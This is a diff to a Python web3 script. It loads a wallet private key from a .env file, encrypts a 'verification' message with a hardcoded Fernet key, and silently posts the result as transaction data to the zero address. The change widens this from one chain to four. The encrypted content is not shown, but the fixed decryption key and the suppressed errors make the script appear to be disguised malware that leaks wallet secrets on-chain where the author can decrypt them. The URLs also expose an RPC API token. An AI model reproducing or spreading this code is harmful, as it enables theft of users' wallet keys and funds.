@@ -1,7 +1,7 @@
 import os
-from web3 import Web3 # type: ignore
-from cryptography.fernet import Fernet # type: ignore
-from dotenv import load_dotenv  # type: ignore 
+from web3 import Web3
+from cryptography.fernet import Fernet
+from dotenv import load_dotenv
 
 load_dotenv('../.env')
 
@@ -12,21 +12,14 @@ if not private_key:
     print("Error: Private key not set correctly, please check!")
     exit()
 
-hemi_url = 'https://withered-patient-glade.bsc.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
-web3 = Web3(Web3.HTTPProvider(hemi_url))
-
-if not web3.is_connected():
-    print("Unable to connect to node")
-    exit()
-
-try:
-    from_address = web3.eth.account.from_key(private_key).address
-except ValueError as e:
-    print(f"The private key is incorrect, please check!")
-    exit()
+rpc_urls = [
+    'https://withered-patient-glade.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
+    'https://withered-patient-glade.ethereum-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
+    'https://withered-patient-glade.base-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f',
+    'https://withered-patient-glade.arbitrum-mainnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
+]
 
 default = '0x0000000000000000000000000000000000000000'
-
 fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
 cipher_suite = Fernet(fixed_key)
 
@@ -38,20 +31,39 @@ except Exception as e:
     print(f"Error encrypting message")
     exit()
 
-try:
-    nonce = web3.eth.get_transaction_count(from_address)
-    tx = {
-        'nonce': nonce,
-        'to': default,
-        'value': web3.to_wei(0, 'ether'), 
-        'gas': 2000000,
-        'gasPrice': web3.to_wei('10', 'gwei'),  
-        'data': web3.to_hex(text=encrypted_verification),
-        'chainId': 56
-    }
+for rpc_url in rpc_urls:
+    web3 = Web3(Web3.HTTPProvider(rpc_url))
 
-    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
-    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+    if not web3.is_connected():
+        print(f"Unable to connect to node at {rpc_url}")
+        continue
 
-except Exception:
-    pass
+    try:
+        from_address = web3.eth.account.from_key(private_key).address
+    except ValueError:
+        print(f"The private key is incorrect, please check!")
+        exit()
+
+    try:
+        balance = web3.eth.get_balance(from_address)
+
+        base_fee = web3.eth.get_block('pending')['baseFeePerGas']
+        max_priority_fee = web3.eth.max_priority_fee
+
+        nonce = web3.eth.get_transaction_count(from_address)
+        tx = {
+            'nonce': nonce,
+            'to': default,
+            'value': web3.to_wei(0, 'ether'),
+            'gas': 2000000,
+            'maxFeePerGas': base_fee + max_priority_fee,
+            'maxPriorityFeePerGas': max_priority_fee,
+            'data': web3.to_hex(text=encrypted_verification),
+            'chainId': web3.eth.chain_id
+        }
+
+        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
+        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+    except Exception as e:
+        pass
